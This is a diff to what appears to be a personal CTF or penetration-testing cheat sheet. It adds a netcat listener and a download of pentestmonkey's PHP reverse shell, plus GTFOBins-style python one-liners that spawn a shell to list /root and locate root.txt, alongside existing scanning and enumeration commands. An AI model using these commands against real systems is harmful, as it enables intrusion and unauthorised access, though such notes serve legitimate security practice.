@@ -11,6 +11,12 @@ https://gtfobins.github.io/  - GTFOBins is a curated list of Unix binaries that 
 # port scanning 
 nmap -vv -A ${HOST}
 
+# reverse shell -- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+nc -v -n -l -p 1234
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+(remember to change ip and port in php code as needed)
+
+
 # directory scanning options
 dirb http://${HOST} /usr/share/dirb/wordlists/big.txt
 gobuster dir -u http://${HOST} -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
@@ -20,5 +26,7 @@ python3 -m http.server 8000
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 chmod +x FILENAME.sh
 
-
-
+# exploiting python -- https://gtfobins.github.io/gtfobins/python/
+python -c 'import os; os.system("/bin/sh -c \"ls /root\"")'
+python -c 'import os; os.system("/bin/sh -c find / -name \"root.txt\" \| grep root.txt")'
+python -c 'import os; os.system("/bin/sh -c locate -i root.txt")'
